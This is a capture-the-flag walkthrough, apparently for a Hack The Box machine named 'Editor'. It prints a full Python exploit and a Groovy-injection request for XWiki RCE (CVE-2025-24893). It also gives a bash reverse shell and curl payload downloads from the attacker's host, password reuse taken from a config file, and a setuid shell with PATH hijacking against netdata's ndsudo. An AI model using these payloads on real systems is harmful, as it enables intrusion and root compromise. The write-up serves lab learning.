### Summary
We find two HTTP instances running, and via subdomain brute-forcing with `ffuf` see `editor.htb` and `wiki.editor.htb`. Nothing interesting with `editor.htb`, but `wiki.editor.htb` is vulnerable to unauthenticated RCE, granting us a foothold as the user `xwiki`. From there, we find a re-used password in the `xwiki` database config and are able to log in as the user `oliver`. We enumerate some additional ports and perform `ssh -L` local tunneling to find a `netdata` instance that ships with a vulnerable version of `ndsudo`, allowing us to acquire root privileges
### Tools
- `ffuf` - subdomain brute-force
- `burp`
- `ssh -L` - local SSH tunneling
- `gcc`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Bruteforce]]
- [[#HTTP - TCP 80]]
- [[#HTTP - TCP 8080]]
	- [[#POC]]
###### [[#User Shell - xwiki]]
- [[#Foothold]]
- [[#Enumeration]]
###### [[#User Shell - oliver]]
- [[#Foothold]]
- [[#Enumeration]]
	- [[#SSH Tunneling]]
- [[#HTTP - TCP 19999]]
###### [[#Root Shell]]
- [[#ndsudo]]
	- [[#poc]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.12.183 -oN nmap/tcp            
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```
```sh
❯ sudo nmap -p 22,80,8080 -sCV -vv 10.129.12.183 -oN nmap/tcpScripts           
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/
|_/xwiki/bin/logout/
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.12.183:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL corresponds with a POSIX adherent system
- Given the `SSH` and `nginx` versions, we're likely working with Ubuntu `22.04`
- Port `80` is redirecting to `editor.htb`

### Subdomain Bruteforce
- Given that domain-based routing is employed here with `editor.htb`, we should check for subdomains that might respond differently than default using `ffuf`:
	- `-ac` is used to automatically calibrate the search, hides garbage
```sh
❯ ffuf -u "http://10.129.12.183" -H "Host: FUZZ.editor.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
...
wiki                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
...
```
- We want to add both `editor.htb` and `wiki.editor.htb` to our `/etc/hosts` file

## HTTP - TCP 80
---
- Looking around we see a documentation hyperlink that directs to `wiki.editor.htb/xwiki`
- We also see a contact email, `contact@editor.htb`
- We can run `feroxbuster` but nothing interesting pops up

## HTTP - TCP 8080
---
- We can navigate to port `8080` and we see that the page is the same as `wiki.editor.htb` which is an instance of xwiki `15.10.8`
- A quick use of `searchsploit` shows that `xwiki` is vulnerable to unauthenticated remote code execution!
- We can grab a POC from [github](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)

### POC
```python
import requests

# Banner
def display_banner():
    print("="*80)
    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution")
    print("Made By Al Baradi Joy")
    print("="*80)

# Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

# Exploit function
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"

    try:
        print(f"[+] Sending request to: {exploit_url}")
        response = requests.get(exploit_url, timeout=10)

        # Check if the exploit was successful
        if response.status_code == 200 and "root:" in response.text:
            print("[✔] Exploit successful! Output received:")
            print(response.text)
        else:
            print(f"[✖] Exploit failed. Status code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")

# Main execution
if __name__ == "__main__":
    display_banner()
    target = input("[?] Enter the target URL (without http/https): ").strip()
    exploit(target)
```
```http
bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}
```
- It looks like there's a squiggly bracket breakout, a lack if input sanitizaion in the `text` parameter allowing for RCE
- We can pop the request open in `Burp` to more easily handle the URL encoding

# User Shell - xwiki
## Foothold
---
- I tried a couple `bash` reverse TCP shell payloads but none of them worked. A lot of times languages like Java and Groovy don’t handle redirects and pipes inside command execution, and this shell is full of them
- We can create a simple reverse shell bash script, `rev`,  to transfer over to the target machine with a python webserver
```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.15.161/12345 0>&1
```

- With our RCE payload, we can execute `curl http://10.10.15.161:12345/rev -o /tmp/rev`
- Then we can execute `bash /tmp/rev` with our netcat listener open and we get a shell!

## Enumeration
---
- There's nothing very interesting in the home directory for `xwiki`
- We can enumerate `/home` to see the `oliver` user, but we're unable to view their directory
- The config directory for `xwiki` is located in `/etc/xwiki`
- If we navigate to `/etc/xwiki`, we can do a quick `grep` for `pass` to search for some easy passwords:
```sh
xwiki@editor:/etc/xwiki$ grep -R "password" .
./hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
...
```
- `hibernate.cfg.xml` is the Hibernate ORM configuration file, it tells hibernate (Java ORM) how to connect to the database
- The interesting bit comes from the database definition:
```xml
    <!-- Configuration for the default database.
         Comment out this section and uncomment other sections below if you want to use another database.
         Note that the database tables will be created automatically if they don't already exist.

         If you want the main wiki database to be different than "xwiki" (or the default schema for schema based
         engines) you will also have to set the property xwiki.db in xwiki.cfg file
    -->
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
```

# User Shell - oliver
## Foothold
---
- We can attempt to use this password, `theEd1t0rTeam99` to log in as the user `oliver`
```sh
❯ nxc ssh 10.129.12.183 -u oliver -p theEd1t0rTeam99
SSH         10.129.12.183   22     10.129.12.183    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.12.183   22     10.129.12.183    [+] oliver:theEd1t0rTeam99  Linux - Shell access!
```
- Looks like it works!

## Enumeration
---
- From here, we can grab `user.txt`:
```sh
oliver@editor:~$ ls
user.txt
oliver@editor:~$ cat user.txt 
cb79034aea1bbc999d618cc7f4f338a6
```

- We can't run `sudo` as `oliver`
- We can't see many of the running processes with `ps aux`
```sh
oliver@editor:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
oliver     38078  0.0  0.2  17076  9684 ?        Ss   01:34   0:00 /lib/systemd/systemd --user
oliver     38436  0.0  0.1   8812  5684 pts/1    Ss   01:35   0:00 -bash
oliver     40416  0.0  0.0  10072  1564 pts/1    R+   01:39   0:00 ps aux
```

- We can inspect the open ports with `ss` or `netstat`:
```sh
oliver@editor:~$ netstat -lptn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:40403         0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      
tcp6       0      0 :::8080                 :::*                    LISTEN      
tcp6       0      0 :::22                   :::*                    LISTEN      
tcp6       0      0 :::80                   :::*                    LISTEN      
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      
```
- Port `3306` is SQL which is empty of anything interesting and port `33060` is likely related
- We want to take some peeks at ports `40403`, `8079`, `8125`, and `19999`

### SSH Tunneling
- We can tunnel the ports to their corresponding ports with:
```sh
❯ ssh oliver@10.129.12.183 -L 19999:localhost:19999 -L 8125:localhost:8125 -L 8079:localhost:8079 -L 40403:localhost:40403 
```
- Most of these ports provide nothing interesting except for `19999`

## HTTP - TCP 19999
---
- When we navigate to `http://localhost:19999`, we see an instance of `netdata`
![[Pasted image 20260204210111.png]]
- The top bar says the node is out of date, we can navigate to this page and see that we're working with `netdata` `v1.45.2`
- We can google `netdata 1.45.2 cve` and we're directed to the following [github POC](https://github.com/AzureADTrent/CVE-2024-32019-POC)
- We can also see this by inspecting the `Security` tab of the [netdata github page](https://github.com/netdata/netdata)

# Root Shell
## ndsudo
---
- `ndsudo` is a tool shipped with versions of `netdata` that allows an attacker to run arbitrary programs with root permissions
```sh
oliver@editor:~$ find / -type f -name ndsudo 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

- According to the Github POC:
1. Place an executable with a name that is on `ndsudo`’s list of commands (e.g. `nvme`) in a writable path
2. Set the `PATH` environment variable so that it contains this path
3. Run `ndsudo` with a command that will run the aforementioned executable

### poc
```d
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```
- We can take this malicious bash script and compile it like so:
```sh
gcc poc.c -o nvme
```

- Then we can share it to the target box via python webserver
```sh
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ curl http://10.10.15.161:12345/nvme -o /tmp/nvme
```

- Afterwards, we add `/tmp` to our `PATH` variable and execute `nvme-list` which invokes the `nvme` binary which, according to our `PATH` is first found in `/tmp`: 
```sh
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ export PATH=/tmp:$PATH
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ ./ndsudo nvme-list
root@editor:/opt/netdata/usr/libexec/netdata/plugins.d# cd ~/
```

```sh
root@editor:/root# cat root.txt 
9485a00cdca928fd3550ff729e5d7ef8
```



